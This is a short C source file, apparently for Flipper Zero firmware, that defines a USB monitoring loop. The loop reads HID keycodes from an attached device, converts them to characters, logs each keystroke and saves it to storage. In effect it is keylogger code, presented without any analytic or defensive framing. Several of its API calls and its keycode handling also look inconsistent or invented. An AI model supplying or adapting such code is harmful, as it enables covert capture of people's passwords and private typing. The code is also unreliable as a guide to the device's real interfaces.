#include <furi.h>
#include <furi_hal.h>
#include "keycode_mapper.h"
#include "storage.h"

void start_usb_monitoring() {
    furi_log("Starting USB monitoring...");
    FuriHalUsb.init();

    while (!furi_hal_usb_device_ready()) {
        furi_delay_ms(100);
    }

    while (furi_hal_usb_device_ready()) {
        uint8_t keycode[8];
        if (furi_hal_usb_hid_receive(keycode, sizeof(keycode))) {
            char character = map_keycode_to_char(keycode);
            furi_log("Keystroke: %c", character);
            save_keystroke_to_storage(character);
        }
    }

    FuriHalUsb.deinit();
    furi_log("USB monitoring stopped.");
}
